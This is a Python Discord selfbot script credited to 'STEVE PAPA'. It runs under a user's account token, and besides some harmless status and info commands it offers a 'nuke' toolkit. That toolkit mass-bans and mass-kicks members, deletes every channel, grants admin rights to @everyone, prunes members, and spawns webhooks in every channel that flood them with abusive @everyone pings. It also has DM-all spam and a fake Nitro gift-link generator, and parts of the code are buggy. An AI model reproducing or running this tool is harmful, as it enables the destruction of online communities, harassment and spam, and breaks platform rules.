import os
import json
import string
import base64
import discord, aiohttp
from discord.ext import commands, tasks
from discord import Permissions
import requests
from colorama import Fore
import asyncio
import requests
import logging
import sys
import random
from random import randint
from threading import Thread
import threading
import subprocess
import requests
import time
import datetime
from time import sleep
from discord import Color, Embed
import colorama
from colorama import Fore, Style
import urllib.parse
import urllib.request
import re
import io
from itertools import cycle
from requests_futures.sessions import FuturesSession
import webbrowser

colorama.init()

intents = discord.Intents.default()
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True

client = commands.Bot(description='THIS SELFBOT IS CREATED BY STEVE PAPA', command_prefix='>', self_bot=True, intents=intents)
header = {"Authorization": f'Bot {"Token"}'}

stream_url = "https://replit.com/@WannaBeGhost"
Token = input("{}({}SELFBOT{}) INPUT ACCOUNT TOKEN{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET))
reason = input("{}({}SELFBOT{}) INPUT BAN REASON{}:{} ".format(Fore.RESET, "\x1b[38;5;21m", Fore.RESET, "\x1b[38;5;21m", Fore.RESET))

#NUKE HELP COMMAND
@client.command()
async def nukehelp(ctx):
    nukehelp = (f"**╭・⌬・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n**[ __NUKE COMMANDS__... ]**\n\n**[>]・ `RS`  [ RENAME SERVER ] [ >RS {SERVERNAME} ] **\n**[>]・`PINGS`  [ WEBHOOK PINGS ] **\n**[>]・ `BAN` [ >BAN {USERMENTION} ] **\n**[>]・ `KICK` [ >KICK {USERMENTION} ] **\n**[>]・ `ADMINALL` **\n**[>]・ `ADMINSERVERS` [ >ADMINSERVERS {USERTOKEN} ] **\n**[>]・ `DC` [ DELETE CHANNELS ] **\n**[>]・ `NICKALL` [ >NICKALL {NAME} ] **\n**[>]・ `MASSUNBAN`  **\n**[>]・ `MR` [ MASS ROLES ] **\n**[>]・ `MC` [ MASS CHANNELS ] **\n**[>]・ `MASSBAN` **\n**[>]・ `MASSKICK` **\n**[>]・ `PRUNE` **\n**[>]・ `NUKE` [ NUKE ALL NUKE CMDS MIXED ] **\n\n**・` TYPE [HELP] FOR NORMAL COMMANDS...` **\n\n**[>]・__Request creator__ : `{client.user.name}`**\n**[>]・__This SelfBot Is Created By__ - __STEVE PAPA__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(nukehelp)
    print(f"{Fore.GREEN}[>] NUKE HELP SENT SUCCESSFULLY ")
    await ctx.message.delete()


#HELP COMMAND
@client.command()
async def Help(ctx):
    message = (
        f"**╭・⌬・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n**[ __HELP COMMANDS__... ]**\n\n**[>]・ `BANNER` **\n**[>]・ `VOUCH` **\n**[>]・ `STREAM` **\n**[>]・ `WATCH` **\n**[>]・ `LISTEN` **\n**[>]・ `PLAY` **\n**[>]・ `STOPACTIVITY` **\n**[>]・ `LINK` **\n**[>]・ `SPAM` **\n**[>]・ `DMALL` **\n**[>]・ `MASSREACT` **\n**[>]・ `BOOST` **\n**[>]・ `INFO` **\n**[+]・ `YTSEARCH` **\n**[>]・ `CHECKPROMO` **\n**[>]・ `WIFE` **\n**[>]・ `LOCK` **\n**[>]・ `GUILDICON` **\n**[>]・ `PURGE` **\n**[>]・ `PREFIX` **\n**[>]・ `NITRO` **\n**[>]・ `JOINVC` **\n\n**・`TYPE [NUKEHELP] IN LOWERCASE FOR NUKE COMMANDS...` **\n\n**[>]・__Request creator__ : `{client.user.name}`**\n**[>]・__This SelfBot Is Created by__ - __STEVE PAPA__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[>] HELP SENT SUCCESSFULLY  ")
    await ctx.message.delete()

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(
                 name='ID HOSTED HAI KID | .gg/sp1it',
                 url='https://discord.gg/sp1it'))
    print(f"{Fore.GREEN} [>] SELFBOT STARTED | STREAM CREATED")
    print(f"""{Fore.RED}

░██████╗████████╗███████╗██╗░░░██╗███████╗
██╔════╝╚══██╔══╝██╔════╝██║░░░██║██╔════╝
╚█████╗░░░░██║░░░█████╗░░╚██╗░██╔╝█████╗░░
░╚═══██╗░░░██║░░░██╔══╝░░░╚████╔╝░██╔══╝░░
██████╔╝░░░██║░░░███████╗░░╚██╔╝░░███████╗
╚═════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░╚══════╝

██████╗░░█████╗░██████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██████╔╝███████║
██╔═══╝░██╔══██║██╔═══╝░██╔══██║
██║░░░░░██║░░██║██║░░░░░██║░░██║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝""")
    print(f'{Fore.BLUE}╭・⌬・ [>] CONNECTED TO : {client.user.name}')
    print('ㅤㅤㅤㅤㅤ')
    print('[<<<<<==============-|-==============>>>>>]')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.RED}-  JAI SHREE RAM')
    print('ㅤㅤㅤㅤㅤ')
    border_top = '╔════════════════════════════════════════════════════════════════════╗'
    border_bottom = '╚════════════════════════════════════════════════════════════════════╝'
    
    print(border_top)
    print(f'║{Fore.YELLOW}[>] YOU CAN CONTACT ME HERE FOR ANY SUPPORT :{" "*(68-len("[>] YOU CAN CONTACT ME HERE FOR ANY SUPPORT :"))}║')
    print(f'║{" "*(68)}║')
    print(f'║{Fore.GREEN}• YOUTUBE   : *HOGA KUCH*{" "*(68-len("• YOUTUBE   : *HOGA KUCH*"))}║')
    print(f'║• INSTAGRAM : *NHI CHALATA*{" "*(68-len("• INSTAGRAM : *NHI CHALATA*"))}║')
    print(f'║• DISCORD   : @steve_sp1it{" "*(68-len("• DISCORD   : @steve_sp1it"))}║')
    print(border_bottom)
    print(border_top)
    print(f'{Fore.RED}║>>>>> STEVE PAPA ON TOP BXBY <3{" "*(42-len(">>>>> STEVE PAPA ON TOP BXBY <3"))}{Fore.YELLOW}║║║║║║║║║  --  ║║║║║║║║║║║{Fore.BLUE}')
    print(border_bottom)
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(
        f'{Fore.GREEN}[>]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[<]')
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')

#CONFIG
def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config

if __name__ == "__main__":
    config_file_path = "config.json" 
    config = load_config(config_file_path)
  
#=== EDIT THEM ON CONFIG ===
prefix = config.get("prefix")
CHANNEL_NAMES = config.get("CHANNEL_NAMES")
VCHANNELS_NAMES = config.get("VCHANNELS_NAMES")
CATEGORY_NAMES = config.get("CATEGORY_NAMES")
ROLE_NAMES = config.get("ROLE_NAMES")
Webhook_contents = config.get("Webhook_contents")
Twitch_URL = config.get("Twitch_URL")
SERVER_LINK = config.get("SERVER_LINK")
#===================================


#WATCHING
@client.command()
async def watch(ctx, *, message):
    await ctx.message.channel(f"**STREAMING {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


#PLAYING
@client.command()
async def play(ctx, *, message):
    await ctx.message.channel(f"**PLAYING {message}**")
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


#LISTENING
@client.command()
async def listen(ctx, *, message):
    await ctx.message.channel(f"**LISTENING TO {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


#STREAMING
@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
                               url='https://www.twitch.tv/SparkYSelfbot')
    await client.change_presence(activity=stream)


#BOOST
@client.command()
async def boost(channel, guild):
    await channel.send(
        f"**╭・⌬・** __**{guild.name}**__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・Server has :** `{guild.premium_subscription_count} BOOSTS`\n**[>]・Request creator : **`{client.user.name}`\n**[>]・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#SELFBOT INFO
@client.command()
async def selfbot(channel):
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・Version : SELFBOT V3**\n**[+]・ Language : Python**\n**[>]・ Hosted at : Termux**\n**[>]・Request creator : {client.user.name}**\n\n**NOTE :** `THIS SELFBOT IS STILL UNDER DEVELOPMENT, I DON'T HAVE MUCH TIME RN BUT I WILL SURELY ADD MORE CMDS SOON`\n\n**[>]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#VOUCH
async def vouch(channel):
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SERVER LINK` : `https://discord.gg/sp1it`**\n**[+]・ `VOUCH FORMAT` \n`+vouch (user) Legit Got (product) For (price) Thank You`**\n\n**[+]・Request creator : {client.user.name}**\n\n**[+]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await channel.message.delete()


#LINK
@client.command()
async def link(channel):
    await channel.send("- `https://discord.gg/sp1it`")


#NITRO GEN
@client.command(aliases=["nitrogen"])
async def nitro(ctx):
    try:
        await ctx.message.delete()
        code = ''.join(
            random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        print(f"{Fore.GREEN}[>] SUCCESFULLY SENT NITRO CODE !")
    except Exception as e:
        print(f"{Fore.RED}[!] ERROR: {str(e)}")
    await asyncio.sleep(2)


#NSFW
@client.command(aliases=['fuck', 'chudai', '18+', 'xxx', 'nsfw'])
async def wife(ctx):
    try:
        response = requests.get('https://api.waifu.pics/nsfw/waifu')
        data = response.json()
        if 'url' in data:
            image_url = data['url']
            await ctx.message.delete()
            await ctx.send(image_url)
        else:
            await ctx.send('- `[>] ERROR FINDING ANIME GIRLLL`')
            print(f"{Fore.GREEN}[>] WIFE SENT SUCCESSFUL")
    except Exception as e:
        print('- `[>] ERROR WHILE FETCHING IT`', e)
    await asyncio.sleep(2)


#DM ALL
@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


#MASS REACT
@client.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    await asyncio.sleep(2)
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)
        await asyncio.sleep(2)


#SERVER BANNER
@client.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO BANNER`")
        return
    await ctx.send(ctx.guild.banner_url)
    print(f"{Fore.GREEN}[>] MAREACT  SUCCESSFUL")


#SERVER INFO.
@client.command()
async def serverinfo(channel):
    guild = channel.guild
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SERVER NAME` : {guild.name}**\n**[>]・ `GUILD ID` : {guild.id}**\n**[>]・ `CREATED AT` : {channel.guild.created_at}**\n**[>]・ `OWNED BY` : <@{guild.owner_id}>**\n**[>]・ `REIGON` : {guild.region}**\n\n**[>]・Request creator : {client.user.name}**\n\n**[>]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#SERVER PFP
@client.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO ICON`")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{Fore.GREEN}[>] GUILDICON SENT  SUCCESSFUL")


#SERVER RENAME
@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] SERVER RENAME SUCCESSFULLY")


#WEBHOOK SPAM
def wspam(webhook):
    while spammingdawebhookeroos:
        data = {'content': '@everyone @here FUCKED BY STEVE PAPA `https://discord.gg/sp1it`'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 10
                time.sleep(timetowait)
            except:
                delay = random.randint(2, 10)
                time.sleep(delay)

        else:
            delay = random.randint(2, 10)
            time.sleep(delay)


#WEBHOOK PINGS
@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
          

         if len(ctx.guild.text_channels) >= 50:
            webhookamount = len(ctx.guild.text_channels)
    else:
        webhookamount = 10000 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='FUCKED BY STEVE PAPA')
                threading.Thread(target=wspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


#BAN
@client.command()
async def ban(ctx, member: discord.Member, *, reason=reason):
    await member.ban(reason=reason)
    await ctx.send('```SUCCESSFULLY BANNED```')
    print(f"{Fore.GREEN}[>] SUCCESSFULLY BANNED")


#KICK
@client.command()
async def kick(ctx, member: discord.Member, *, reason=reason):
    await member.kick(reason=reason)
    await ctx.send('```SUCCESSFULLY KICKED```')
    print(f"{Fore.GREEN}[>] SUCCESSFULLY KICKED")


#ALL ADMIN
@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2) 
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MAGENTA + 'ADMIN SUCCESSFUL' + Fore.RESET)
    except:
        print(Fore.GREEN + 'UNSUCCESSFUL' + Fore.RESET)
    await asyncio.sleep(2)


#CHANNEL LOCK 
@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=False)
    await ctx.send(ctx.channel.mention + 'CHANNEL LOCKED')
    print(f"{Fore.GREEN}[>] CHANNEL LOCKED")


#SERVER ADMINS
@client.command()
async def serveradmin(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] SHOWN SUCCESSFULLY")


#DELETE CHANNELS
@client.command(aliases=['dc'])
async def deletechannels(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    print(f"{Fore.RED}Deleting Channels . . .")
    for channel in ctx.guild.channels:
        await channel.delete()
    print(f"{Fore.RED} Channels Deleted")


#NICKNAME ALL
@client.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    await asyncio.sleep(2) 
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] NICKNAME SUCCESSFUL")


#MASS UNBAN
@client.command()
async def massunban(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            print(f"failed to unban")
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] UNBAN SUCCESSFUL")


#MASS ROLES
@client.command(aliases=['mr'])
async def massroles(ctx, amount=50):
    await ctx.message.delete()
    await asyncio.sleep(2)
    roles = ctx.guild.roles
    for roles in roles:
        try:
            print(roles.name + "ROLE CREATED")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_role((ROLE_NAMES)
                                                 )
            print(f"[{i}] MASS ROLES")
        except:
            print(f"ERROR MAKING ROLES")
    await asyncio.sleep(2)


#MASS CHANNELS
@client.command(aliases=['mc'])
async def masschannels(ctx, amount=50):
    await ctx.message.delete()
    await asyncio.sleep(2)
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + "CREATED SUCCESSFUL")
        except:
            pass
            print(f"ERROR")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel((CHANNEL_NAMES))
            print(f"[{i}] CHANNELS SUCCESSFUL")
        except:
            print(f"ERROR MAKING CHANNELS")
    await asyncio.sleep(2) 


#MASS SPAM
@client.command()
async def spam(ctx, amount: int, delay_ms: float, *, message):
    await ctx.message.delete()
    await asyncio.sleep(1)
    delay_sec = delay_ms / 1000  # mseconds to seconds
    for _i in range(amount):
        await ctx.send(message)
        await asyncio.sleep(delay_sec)
        print(f"{Fore.GREEN}[>] SPAM SUCCESSFUL ")
    await asyncio.sleep(2)


#MASS BAN
@client.command()
async def massban(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason=reason)
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] MASS BAN SUCCESSFUL")


#MASS KICK
@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason=reason)
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] MASS KICK SUCCESSFUL ")


#1 DAY PRUNE BY STEVE
@client.command()
async def prune(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  try:
            await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles, reason=reason)

  except:
            print(f"{Fore:RED}[! ERROR PRUNING ]")


#SWIZZ MIXED NUKE CMDS
@client.command()
async def nuke(ctx):
  await ctx.channel.send(f">rs SERVER FUCKED BY STEVE PAPA")
  await asyncio.sleep(2)
  await ctx.channel.send(f">prune")
  await asyncio.sleep(2)
  await ctx.channel.send(f">mc")
  await asyncio.sleep(2)
  await ctx.channel.send(f"mr")
  await asyncio.sleep(2)
  await ctx.channel.send(f"pings")
  await asyncio.sleep(2)
  print(f"{Fore.GREEN}[>] ALL CMDS SENT SUCCESSFUL")


#YT SEARCH
@client.command()
async def ytsearch(msg, *, search=''):

    if search == '':
        await msg.send('- `PLEASE PROVIDE A VALID REQUEST...`')
    query_string = urllib.parse.urlencode({"search_query": search})
    html_content = urllib.request.urlopen("http://www.youtube.com/results?" +
                                          query_string)
    search_results = re.findall(r"watch\?v=(\S{11})",
                                html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SEARCH'S FOR` : `{nab}`**\n**[>]・ `URL` : **http://www.youtube.com/watch?v="
        + search_results[0])
    print(f"{Fore.GREEN}[>] YTSEARCH SUCCESSFUL")


#RESTART
@client.command()
async def restart(ctx):
    await ctx.reply(f"`Restarting...`")
    os.execl(sys.executable, sys.executable, *sys.argv)


client.run(Token ,bot=False)
